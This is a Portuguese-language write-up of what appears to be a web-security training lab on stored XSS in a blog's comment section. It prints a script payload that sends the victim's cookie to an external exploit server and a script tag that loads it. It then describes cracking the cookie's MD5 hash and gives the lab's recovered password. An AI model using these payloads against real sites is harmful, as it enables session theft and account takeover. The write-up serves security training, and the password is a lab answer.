## Objetivo
Roubar o cookie stay-logged-in de carlos usando injeção XSS na sessão de comentários

## Vulnerabilidade Identificada
A sessão de comentários do blog era vulneravel a XSS após fazer o teste <script>alert(1)</script> na sessão de comentários e ver o backend lendo como script tag e não texto. (ctrl+u)


## Comandos Utilizados

No exploit server(simulação de VPS) coloquei no body as sources do javascript para roubar o cookie
```javascript
document.location='https://exploit-0a02002303f90c0c808a02ac0186002b.exploit-server.net/exploit?c='+document.cookie
```

Após salvar no exploit server, fui na sessão de comentários e postei um script com src= pro exploit server
```javascript
<script src="https://exploit-0a02002303f90c0c808a02ac0186002b.exploit-server.net/exploit"></script>    
```

Após pegar o cookie de carlos nas logs do exploit server. Decodei com burp em base64 peguei o hash md5
usei esse site para decodar o hash:
``https://crackstation.net/``



## Resultado
carlos:onceuponatime


## Lições Aprendidas
O exploit server é uma simulação de um servidor real VPS, eles fizeram a configuração automatica, mas em um cenário real eu deveria montar o meu próprio VPS.
no lab o burp simula o bot interagindo com a página do comentário postado.
aprendi mais sobre XSS vulnerabilidades e como testar se um parametro é vulneravel. isoladamente pesquisei os sources mais comuns em XSS 
(OBS: o tipo de arquivo tem que estar especificado tanto no body do exploit quanto nos comentários): nesse caso ``/exploit``
